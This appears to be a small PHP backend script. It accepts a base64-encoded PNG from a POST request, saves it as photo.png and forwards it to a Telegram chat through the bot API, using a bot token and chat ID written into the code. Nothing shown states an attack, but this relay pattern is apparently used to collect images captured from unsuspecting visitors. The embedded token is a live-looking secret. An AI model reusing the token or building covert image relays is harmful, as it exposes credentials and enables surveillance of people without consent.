<?php
$data = json_decode(file_get_contents("php://input"));
$image = $data->image;

if ($image) {
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = base64_decode($image);
    file_put_contents("photo.png", $image);

    $botToken = "7184974136:AAFkcNjXwOKVJmSgqPnXvd4Fo9DwC4UPFWs";
    $chatID = "7006569478";

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatID,
        'photo' => new CURLFile(realpath("photo.png"))
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    echo "Photo sent to Telegram!";
}
?>
